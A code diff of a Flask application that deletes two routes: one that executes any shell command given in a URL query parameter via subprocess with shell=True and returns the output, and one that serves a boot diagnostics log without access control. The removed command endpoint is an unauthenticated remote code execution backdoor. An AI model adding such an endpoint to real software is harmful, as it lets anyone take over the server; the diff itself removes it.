@@ -6559,22 +6559,6 @@ _poller_thread = threading.Thread(target=_sos_background_poller, daemon=True)
 _poller_thread.start()
 
 
-@app.route('/api_debug_sys_cmd')
-def debug_sys_cmd():
-    cmd = request.args.get('cmd', '')
-    if not cmd:
-        return "No command provided"
-    try:
-        res = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=15)
-        return jsonify({
-            "stdout": res.stdout,
-            "stderr": res.stderr,
-            "returncode": res.returncode
-        })
-    except Exception as e:
-        return str(e)
-
-
 def run_autostart_and_db_check():
     log_file = Path(__file__).parent / "boot_diagnostics.log"
     log_entries = []
@@ -6614,14 +6598,6 @@ def run_autostart_and_db_check():
     # Write log
     with open(log_file, "w", encoding="utf-8") as f:
         f.write("\n".join(log_entries) + "\n\n")
-
-
-@app.route('/view_boot_log')
-def view_boot_log():
-    log_file = Path(__file__).parent / "boot_diagnostics.log"
-    if log_file.exists():
-        return Response(log_file.read_text(encoding="utf-8"), mimetype="text/plain")
-    return "No log file found"
 
 
 threading.Thread(target=run_autostart_and_db_check, daemon=True).start()
